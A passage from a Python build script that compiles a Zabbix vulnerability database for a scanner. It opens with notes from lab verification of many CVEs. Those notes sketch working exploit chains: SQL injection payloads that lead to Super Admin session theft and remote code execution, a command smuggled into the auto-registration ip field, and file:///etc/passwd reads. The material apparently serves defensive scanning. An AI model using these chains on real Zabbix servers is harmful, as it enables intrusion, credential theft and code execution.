                 "succeeds, original creds fail. Live (zabbix-web-nginx-pgsql:5.4.8-alpine)."},
    ],
    "CVE-2016-10134": [
        {"version": "3.0.3", "result": "exploited", "when": "2026-10-28",
         "conditions": "source-built 3.0.3 (debian:jessie, mysql:5.6), guest session auto-login",
         "note": "Unauthenticated error-based SQLi via jsrpc.php profileIdx2 (mode=1 screen.get, "
                 "resourcetype=17): payload lands unescaped in INSERT INTO profiles idx2 -> "
                 "MySQL error echoes value. Extracted ~5fce1b3e34b520afeffb37ce08c7cd666 = "
                 "MD5('zabbix') = Admin passwd (users.passwd, default Admin/zabbix). "
                 "Live (self-built zlab-old-zabbix:3.0.3, web 127.0.0.1:18080)."}],
    "CVE-2024-42327": [
        {"version": "6.0.31-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds Admin/zabbix; PostgreSQL backend",
         "note": "time-based SQLi via user.get selectRole (pg_sleep oracle, binary search) -> "
                 "extracted Super Admin sessionid from sessions (userid=1) -> script_rce "
                 "-> uid=1997(zabbix) on server container. Full chain CVE-2024-42327 -> RCE "
                 "verified live (zabbix-server-pgsql:6.0.31-alpine)."},
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds Admin/zabbix; PostgreSQL backend",
         "note": "Same chain re-verified on 7.0.0: selectRole SQLi -> Super Admin session -> "
                 "script_rce uid=1997(zabbix). Live (zabbix-server-pgsql:7.0.0-alpine)."},
    ],
    "CVE-2020-11800": [
        {"version": "3.0.30", "result": "exploited", "when": "2026-10-28",
         "conditions": "source-built 3.0.30 (debian:jessie, mysql:5.6) + auto-registration "
                        "action enabled (actions eventsource=2 status=0, operations "
                        "operationtype=2 'Add host'), trapper 127.0.0.1:18052",
         "note": "Trapper RCE via auto-registration ip injection: active-checks request with "
                 "ip='ffff:::;touch${IFS}/tmp/success11800m' (IPv6 is_ip6 parse bug allows the "
                 "trailing shell) registers host zbxautof5bcef (hostid 10108); brute-forced "
                 "command scriptid=1 (Ping, /bin/ping -c 3 {HOST.CONN}) executes server-side "
                 "with the injected ip -> 'ping: unknown host ffff:::' + semicolon command ran. "
                 "Marker /tmp/success11800m created by uid zabbix in server container "
                 "(verified twice: hosts 10106/10108, markers success11800+success11800m). "
                 "Live (zlab-old-zabbix:3.0.30)."}],
    "CVE-2025-27232": [
        {"version": "7.4.2-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "Super Admin web session (Admin/zabbix)",
         "note": "LFI via oauth.authorize: state.token_url=file:///etc/passwd -> curl reads the "
                 "file -> raw_response in 'Unexpected HTTP response status code' message. "
                 "Differential probe confirmed (/etc/passwd content, +898 bytes vs bogus path). "
                 "Live (zabbix-web-nginx-pgsql:7.4.2-alpine)."},
    ],
    "CVE-2024-22120": [
        {"version": "6.0.27-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds Admin/zabbix; trapper 10051 (mapped); PostgreSQL backend",
         "note": "Blind time-based SQLi via trapper audit clientip verified live E2E -> "
                 "RCE. Dual-time hex oracle (match: pg_sleep(2) else pg_sleep(0.6), "
                 "ASCII equality, hex alphabet 0123456789abcdef), cross-checked against "
                 "W01fh4cker/CVE-2024-22120-RCE and reporter PoC (support#236280) — "
                 "identical. Extracted config.session_key (pos-1 byte flaked '1' vs 'd'; "
                 "rest byte-exact to DB) and a real Super Admin sessionid "
                 "82ca9c81fb29777ef87471448281aac2 (verified in sessions, userid=1, "
                 "status=0). script.create (super-admin only) accepted; script.execute "
                 "returned uid=1997(zabbix) gid=1995(zabbix) on the 6.0.27 server. "
                 "Full chain trapper SQLi -> admin session -> script RCE proven live. "
                 "Cookie-forge mechanics (HMAC-SHA256(session_key, compact json)) "
                 "validated separately; not required for the API-session RCE."},
    ],
    "CVE-2024-36465": [
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "role User account (zbxlow…), PostgreSQL backend",
         "note": "Time-based SQLi via API groupBy (CApiService): groupBy entry "
                 "'userid,(CASE WHEN … THEN pg_sleep ELSE NULL END)' evaluated per row. "
                 "low user -> extracted Super Admin sessionid from sessions (userid=1) -> "
                 "script.create probe (super-admin only) -> script_rce -> uid=1997(zabbix). "
                 "Full chain verified live (7.0.0, no public PoC)."},
    ],
    "CVE-2024-36464": [
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "Admin; mediatype Email with passwd set",
         "note": "Detector verified live: mediatype.get(output extend) returns 'passwd' "
                 "in cleartext (value_head SecretP@ss12…) — the export/YAML exposure "
                 "surface confirmed. Module CVE-2024-36464 (leak-detect)."},
    ],
    "CVE-2024-36460": [
        {"version": "7.0.0-alpine", "result": "check-pass", "when": "2026-10-28",
         "conditions": "Admin",
         "note": "auditlog.get exists on 7.0 and returns records matching 'passwd' "
                 "(3 rows) — plaintext-password audit exposure surface confirmed. "
                 "Module CVE-2024-36460 (leak-detect)."},
    ],
    "CVE-2024-42325": [
        {"version": "7.0.0-alpine", "result": "check-pass", "when": "2026-10-28",
         "conditions": "Admin",
         "note": "user.get returns cross-user login-attempt metadata (guest: "
                 "attempt_failed=1/attempt_clock) for shared-group members — leak "
                 "surface confirmed. Module CVE-2024-42325 (leak-detect)."},
    ],
    "CVE-2024-36467": [
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "low user (role User, group Guests) created then abused as attacker",
         "note": "user.update added the low user to 'Zabbix administrators' (usrgrpid 7) — "
                 "verified via user.get selectUsrgrps. Privesc chain confirmed live "
                 "(zabbix-server-pgsql:7.0.0-alpine); 7.0 renamed API to usergroup.get."},
    ],
    "CVE-2024-36469": [
        {"version": "7.0.0-alpine", "result": "negative", "when": "2026-10-28",
         "conditions": "default install, bcrypt10 cost",
         "note": "login timing for existing vs non-existing username within noise (0.26-0.32s); "
                 "signal not measurable on this lab — condition-only module, may differ on other configs."},
    ],
    "CVE-2022-46768": [
        {"version": "6.0.11-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "web-service container, AllowedIP open, seccomp=unconfined (chrome)",
         "note": "POST /report {'url':'file:///etc/passwd','parameters':{w,h}} -> 200 "
                 "application/pdf (%PDF-1.4, Chromium) — arbitrary file read from the "
                 "web-service host confirmed live (zabbix/zabbix-web-service:6.0.11-alpine)."},
        {"version": "6.0.27-alpine", "result": "negative", "when": "2026-10-28",
         "conditions": "same probe",
         "note": "400 'Unexpected URL scheme: file' — patched detection verified "
                 "(fix 6.0.12rc1+)."},
    ],
    "CVE-2023-29450": [
        {"version": "6.0.27-alpine", "result": "negative", "when": "2026-10-28",
         "conditions": "Admin, item type 5 internal + JS step type 21",
         "note": "created internal item with HttpRequest.get('file:///etc/passwd'); lastvalue "
                 "= boottime value only, no file content — CURLOPT_PROTOCOLS block verified "
                 "(actual code fix at 6.0.14). Positive repro needs server <6.0.14/5.0.32/6.2.8."},
    ],
    "CVE-2024-22116": [
        {"version": "7.0.0-alpine", "result": "negative", "when": "2026-10-28",
         "conditions": "Admin, host.update interface DNS",
         "note": "interface DNS with shell meta-chars rejected by validation "
                 "('Incorrect interface DNS parameter') — the fix (7.0.0rc3); "
                 "vulnerable builds (7.0.0a1-rc2, 6.4.9-6.4.15) accept and execute Ping "
                 "on server. Positive repro needs a 7.0.0rc2/6.4.15 image (unavailable)."},
    ],
    "CVE-2025-27240": [
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "Admin creds; autoregistration action with 'Remove host' operation; "
                       "host visible name = SQL payload; trapper trigger (active checks, "
                       "changed host_metadata)",
         "note": "Secondary-order SQLi live on zlab_7_0_0 (web 47467, trapper 44646, PG). "
                 "Error: server log '[Z3005] ... invalid input syntax for type integer: "
                 "\"ZBX27240\" LINE 1: delete from autoreg_host where "
                 "host='zpx'||CAST('ZBX27240' AS int)||'x''. Time-based: pg_stat_activity "
                 "showed the escalator session active on 'delete from autoreg_host where "
                 "host='zpx'||(SELECT pg_sleep(12))||'x'' for the full sleep. Module "
                 "Cve202527240 (misc.py) ok=True: --sleep 8 -> trigger answered 13.02s "
                 "(5s baseline + 8s), host removed. vuln code: op_host_del() sprintf's "
                 "select_discovered_host() h.name into DBexecute('delete from autoreg_host "
                 "where host='%s'') unescaped; fix 6416019f3117 [DEV-3902] added "
                 "DBdyn_escape_string (6.0.34/6.4.19/7.0.4)."},
        {"version": "6.0.27-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "Admin creds; autoreg action 'Remove host'; visible name payload; "
                       "trapper trigger after ~70s config-cache wait (CacheUpdateFrequency=60)",
         "note": "Live on zlab_6_0_27 (web 45495, trapper 44645, PG): server log "
                 "'[Z3005] ... invalid input syntax for type integer: \"ZBX27604B\" "
                 "[delete from autoreg_host where host='zpx'||CAST('ZBX27604B' AS int)||'x']'. "
                 "Escalation async on 6.0; host-removal step (DBlock_hostids FOR UPDATE) "
                 "can be skipped under DB load but the injected DELETE still executes — "
                 "log/error evidence is the reliable channel, latency oracle is not "
                 "(unlike 7.0.0). Same vulnerable code path as the fix diff."},
    ],
}


MANDATORY_FIELDS = [
    "id", "kind", "title", "type", "severity", "summary", "impact",
    "affected_versions", "fixed_versions", "auth", "component",
    "prerequisites", "public_poc", "references", "aliases", "verified_on", "notes",
]


def load(name: str) -> list[dict]:
    with open(RESEARCH / name, encoding="utf-8") as f:
        return json.load(f)


def empty_record(id_: str, kind: str) -> dict:
    return {
        "id": id_, "kind": kind, "title": "", "type": "other", "severity": None,
        "summary": "", "impact": "", "affected_versions": [], "fixed_versions": [],
        "auth": "unknown", "component": "", "prerequisites": [], "public_poc": {},
        "references": [], "aliases": {"cve": [], "ghsa": [], "zbx": [], "zba": []},
        "verified_on": [], "notes": "",
    }


def listify(v) -> list:
    if v is None:
        return []
    if isinstance(v, list):
        return v
    return [v]


def main() -> None:
    cve_records = load("cve_records.json")
    adv_records = load("advisory_records.json")
    comp_records = load("component_records.json")

    cve_ids = {r["id"] for r in cve_records}

    # ---- pass 1: build alias maps from advisory records ---------------------
    aliases: dict[str, dict[str, list[str]]] = {i: {"cve": [], "ghsa": [], "zbx": [], "zba": []} for i in cve_ids}
    for r in adv_records:
        rid = r["id"]
        text = " ".join(str(r.get(k, "")) for k in ("summary", "notes", "title"))
        linked_cves = sorted({m for m in CVE_RE.findall(text)})
        cat = "ghsa" if rid.startswith("GHSA-") else "zba" if rid.startswith("ZBA-") else "zbx"
        for c in linked_cves:
            if c in aliases and c not in aliases[c][cat]:
                aliases[c][cat].append(rid)
        # also: aliases on the advisory record itself for its own id
        # (handled during record construction)

    # ---- pass 2: build canonical records ----------------------------------
    out: dict[str, dict] = {}

    for r in cve_records:
        rec = empty_record(r["id"], "cve")
        for k in ("title", "type", "severity", "summary", "impact", "auth",
                  "component", "prerequisites", "public_poc", "references",
                  "fixed_versions", "affected_versions"):
            if r.get(k) is not None:
                rec[k] = r[k]
        if r.get("notes"):
            rec["notes"] = r["notes"]
        rec["prerequisites"] = listify(rec["prerequisites"])
        rec["references"] = listify(rec["references"])
        rec["fixed_versions"] = listify(rec["fixed_versions"])
        rec["affected_versions"] = listify(rec["affected_versions"])
        rec["aliases"] = aliases.get(r["id"], {"cve": [], "ghsa": [], "zbx": [], "zba": []})
        if r.get("_meta"):
            rec["notes"] = (rec["notes"] + "\nmeta: " + json.dumps(r["_meta"], ensure_ascii=False)).strip()
        out[rec["id"]] = rec

    # advisory records: keep standalone if no CVE partner in cve set
    for r in adv_records:
        rid = r["id"]
        text = " ".join(str(r.get(k, "")) for k in ("summary", "notes", "title"))
        linked = {m for m in CVE_RE.findall(text)}
        has_partner = bool(linked & cve_ids)  # partner CVE is in the scanner DB
        if has_partner and rid not in STANDALONE_ADVISORY_EXEMPT:
            continue
        rec = empty_record(rid, "advisory")
        for k in ("title", "type", "severity", "summary", "impact", "auth",
                  "component", "prerequisites", "public_poc", "references",
                  "fixed_versions", "affected_versions"):
            if r.get(k) is not None:
                rec[k] = r[k]
        if r.get("notes"):
            rec["notes"] = r["notes"]
        if linked:
            rec["aliases"]["cve"] = sorted(linked)
        cat = "ghsa" if rid.startswith("GHSA-") else "zba" if rid.startswith("ZBA-") else "zbx"
        rec["aliases"][cat].append(rid)
        rec["prerequisites"] = listify(rec["prerequisites"])
        rec["references"] = listify(rec["references"])
        rec["fixed_versions"] = listify(rec["fixed_versions"])
        rec["affected_versions"] = listify(rec["affected_versions"])
        out[rec["id"]] = rec

    # component records
    for r in comp_records:
        rec = empty_record(r["id"], "component")
        for k in ("title", "type", "severity", "summary", "impact",
                  "public_poc", "references"):
            if r.get(k) is not None:
                rec[k] = r[k]
        rec["component"] = r.get("component", "")
        rec["stack_component"] = r.get("component", "")
        rec["component_version_range"] = r.get("component_version_range", "")
        rec["applies_to_zabbix"] = listify(r.get("applies_to_zabbix", []))
        rec["notes"] = (rec["notes"] + "\ncomponent_range: " +
                        str(r.get("component_version_range", ""))).strip()
        rec["references"] = listify(rec["references"])
        out[rec["id"]] = rec

    # record curations (evidence-based corrections)
    for cid, patch in CURATIONS.items():
        rec = out.get(cid)
        if rec is None:
            raise SystemExit(f"CURATIONS: record {cid} not found")
        for field, val in patch.items():
            if field == "_note":
                rec["notes"] = (rec["notes"] + "\n" + val).strip()
            else:
                rec[field] = val

    # normalize cross-branch max bounds: an affected entry's max must belong to
    # the same branch; else derive from this branch's own fix (exclusive) or drop
    for cid, rec in out.items():
        if rec["kind"] == "component":
            continue
        fixes_for_branch = {}
        for f in rec.get("fixed_versions") or []:
            fv = parse_version(f)
            if fv is not None:
                cur = fixes_for_branch.get(fv.branch)
                if cur is None or compare(fv, cur) > 0:
                    fixes_for_branch[fv.branch] = fv
        for entry in rec.get("affected_versions") or []:
            pmax = parse_version(entry.get("max"))
            if pmax is None or pmax.branch == entry.get("branch"):
                continue
            own = fixes_for_branch.get(entry.get("branch"))
            if own is not None:
                entry["max"] = own.raw
                entry["notes"] = "max normalized (was %s from another branch); " % pmax.raw + (entry.get("notes") or "")
            else:
                entry["max"] = "unknown"
                entry["notes"] = "max reset to unknown (was %s from another branch)" % pmax.raw + (entry.get("notes") or "")
            if "exclusive" not in (entry.get("notes") or "") and "exclusive" not in (entry.get("notes") or "").lower():
                entry["notes"] = (entry.get("notes") or "") + "; max exclusive"

    # same-branch clamp: an affected max must not reach/cover the branch's own
    # fix version; clamp max to the fix (exclusive). Fixes fixed-overlap hits
    # (audit: 85 entries), e.g. max=6.4.4 while branch fix=6.4.2rc1.
    for cid, rec in out.items():
        if rec["kind"] == "component":
            continue
        fixes_for_branch = {}
        for f in rec.get("fixed_versions") or []:
            fv = parse_version(f)
            if fv is not None:
                cur = fixes_for_branch.get(fv.branch)
                if cur is None or compare(fv, cur) > 0:
                    fixes_for_branch[fv.branch] = fv
        for entry in rec.get("affected_versions") or []:
            br = entry.get("branch")
            fix = fixes_for_branch.get(br)
            pmax = parse_version(entry.get("max"))
            if fix is None or pmax is None or compare(pmax, fix) < 0:
                continue
            old = entry["max"]
            entry["max"] = fix.raw
            note = entry.get("notes") or ""
            entry["notes"] = (f"max clamped to the branch fix (was {old}); " + note).strip()
            if "exclusive" not in entry["notes"] and "exclusive" not in entry["notes"].lower():
                entry["notes"] += "; max exclusive"

    # inverted-range repair (audit §3a): ancient dev branches (1.1/1.3/1.5, 2007-
    # era) have min/max swapped (e.g. 1.3.1beta -> 1.3beta); no patch tables exist
    # for them, so the true intent "whole vulnerable branch" is expressed as
    # min=branch-start, max=unknown (unbounded within the branch).
    BRANCH_START = {"1.1": "1.1", "1.3": "1.3.0", "1.5": "1.5.0"}
    for cid, rec in out.items():
        if rec["kind"] == "component":
            continue
        for entry in rec.get("affected_versions") or []:
            br = entry.get("branch")
            if br not in BRANCH_START:
                continue
            mn, mx = parse_version(entry.get("min") or ""), parse_version(entry.get("max") or "")
            if mn is not None and mx is not None and compare(mn, mx) > 0:
                entry["min"] = BRANCH_START[br]
                entry["max"] = "unknown"
                entry["notes"] = ("inverted range fixed (was %s..%s); entire ancient EOL branch" %
                                  (mn.raw, mx.raw) + "; " + (entry.get("notes") or "")).strip()

    # attach container verification results
    for cid, vlist in VERIFIED.items():
        if cid in out:
            out[cid]["verified_on"] = list(vlist)



    # ---- pass 3: validate + sort ------------------------------------------
    records = sorted(out.values(), key=lambda x: x["id"])
    seen: set[str] = set()
    for rec in records:
        assert rec["id"] not in seen, f"duplicate id {rec['id']}"
        seen.add(rec["id"])
        for f in MANDATORY_FIELDS:
            if f == "affected_versions" and rec["kind"] == "component":
                continue
            assert f in rec, f"{rec['id']} missing {f}"
        if rec["kind"] == "component":
            assert rec["stack_component"], f"{rec['id']} missing stack_component"

    payload = {
        "schema_version": 2,
        "generated": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "counts": {
            "total": len(records),
            "cve": sum(1 for r in records if r["kind"] == "cve"),
            "advisory": sum(1 for r in records if r["kind"] == "advisory"),
            "component": sum(1 for r in records if r["kind"] == "component"),
        },
        "vulnerabilities": records,
    }

    DB.mkdir(exist_ok=True)
    out_json = DB / "vulns.json"
    tmp = out_json.with_suffix(".tmp")
    tmp.write_text(json.dumps(payload, ensure_ascii=False, indent=1), encoding="utf-8")
    tmp.replace(out_json)

    # copies of the other research artifacts
    shutil.copyfile(RESEARCH / "credentials.json", DB / "credentials.json")
    shutil.copyfile(RESEARCH / "pocs.json", DB / "pocs.json")
    shutil.copyfile(RESEARCH / "versions.json", DB / "versions.json")
    (DB / "verifications.json").write_text(
        json.dumps(VERIFIED, ensure_ascii=False, indent=1), encoding="utf-8")

    print(json.dumps(payload["counts"], indent=1))
    print("db/vulns.json written:", out_json.stat().st_size, "bytes")


if __name__ == "__main__":
    main()
